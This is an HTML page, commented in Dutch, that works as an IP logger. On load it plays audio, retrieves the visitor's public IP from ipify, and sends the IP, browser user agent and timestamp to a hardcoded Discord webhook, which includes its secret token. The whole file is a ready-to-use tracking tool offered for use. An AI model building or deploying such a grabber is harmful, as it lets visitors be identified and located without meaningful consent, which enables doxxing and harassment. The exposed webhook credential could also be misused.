<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>IP Logger</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background-color: #f0f0f0;
            text-align: center;
            padding-top: 50px;
        }
        h1 {
            color: #333;
        }
        p {
            color: #666;
            margin-bottom: 40px;
        }
        #music {
            display: none;
        }
    </style>
    <script>
        window.onload = function() {
            var audio = new Audio('sound.mp3');
            audio.play();
            
            var script = document.createElement('script');
            script.src = 'https://api.ipify.org?format=jsonp&callback=getIP';
            document.getElementsByTagName('head')[0].appendChild(script);
        };

        // Functie om IP-adres, gebruikersagent en tijdstip te verkrijgen
        function getIP(json) {
            var ipAddress = json.ip;
            var userAgent = navigator.userAgent;
            var timestamp = new Date().toISOString();
            sendToDiscord(ipAddress, userAgent, timestamp);
        }

        // Functie om IP-adres, gebruikersagent en tijdstip naar Discord webhook te sturen in een embed bericht
        function sendToDiscord(ipAddress, userAgent, timestamp) {
            var webhookURL = 'https://discord.com/api/webhooks/1213788395726311464/Qu04CT-Yp-s2BttXP2jZGSm_iTWHA08MFm-OCxQHCCeiq9J-RL5VYX41Oj-5moEPMAtP';

            // Maak een embed object aan met de IP-adres, gebruikersagent en tijdstip
            var embed = {
                "embeds": [
                    {
                        "title": "IP Logger",
                        "description": "Een gebruiker heeft de pagina bezocht.",
                        "color": 16711680, // Rood
                        "fields": [
                            {
                                "name": "IP Adres",
                                "value": ipAddress,
                                "inline": true
                            },
                            {
                                "name": "Gebruikersagent",
                                "value": userAgent,
                                "inline": true
                            },
                            {
                                "name": "Tijdstip",
                                "value": timestamp,
                                "inline": true
                            }
                        ]
                    }
                ]
            };

            // Maak een nieuw XMLHttpRequest object aan
            var xhr = new XMLHttpRequest();

            // Definieer de methode en URL voor het verzoek
            xhr.open("POST", webhookURL);

            // Stel de content type header in
            xhr.setRequestHeader("Content-Type", "application/json");

            // Stel de payload in met het ingesloten bericht
            var payload = JSON.stringify(embed);
            
            // Stuur het verzoek
            xhr.send(payload);
        }
    </script>
</head>
<body>
    <h1>Welkom bij onze geweldige site!</h1>
    <p>Geniet van de muziek terwijl we uw IP-adres loggen.</p>
    <audio id="music" autoplay loop>
        <source src="sound.mp3" type="audio/mpeg">
        Your browser does not support the audio element.
    </audio>
</body>
</html>
